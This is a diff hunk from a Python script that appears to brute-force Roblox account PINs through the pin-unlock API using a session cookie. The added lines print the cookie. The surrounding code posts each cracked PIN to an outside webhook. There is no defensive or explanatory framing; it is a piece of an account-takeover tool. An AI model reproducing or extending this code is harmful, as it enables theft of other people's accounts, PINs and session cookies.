@@ -7844,6 +7844,8 @@ try:
             cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
           break
       except KeyError:
+        cprint("Cookie:", 'blue')
+        print(cookie)
         cprint(f"Pin found: {pin}", 'green')
         r = requests.post(webhook, data={'content':pin})
         if not r.status_code ==200:
